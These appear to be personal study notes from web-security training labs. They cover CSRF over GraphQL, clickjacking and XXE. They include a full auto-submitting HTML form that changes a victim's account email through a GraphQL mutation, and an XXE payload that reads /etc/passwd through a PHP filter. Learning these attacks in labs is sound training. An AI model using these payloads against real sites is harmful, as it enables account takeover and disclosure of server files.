**Performing CSRF exploits over GraphQL**

```xml
    <form action="https://{lab}/graphql/v1" method="POST">
      <input type="hidden" name="query" value="mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#123;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#123;email&#125;&#125;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;test2&#64;test5&#46;com&quot;&#125;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
```

**Clickjacking with a frame buster script**
- Clickbandit -> allow forms



## Return to these labs
- SameSite Strict bypass via sibling domain
  - Uses cross-site WebSocket hijacking
- Rest of the clickjacking labs


## Fix in notes
- GraphQL - Github markdown issue with double curly braces
- Add `<!DOCTYPE+foo+[+<!ENTITY+xxe+SYSTEM+"php://filter/convert.base64-encode/resource=/etc/passwd">+]><root><name>%26xxe;</name><email>test@test.com</email></root>` to XXE (using php filter to grab file with XXE)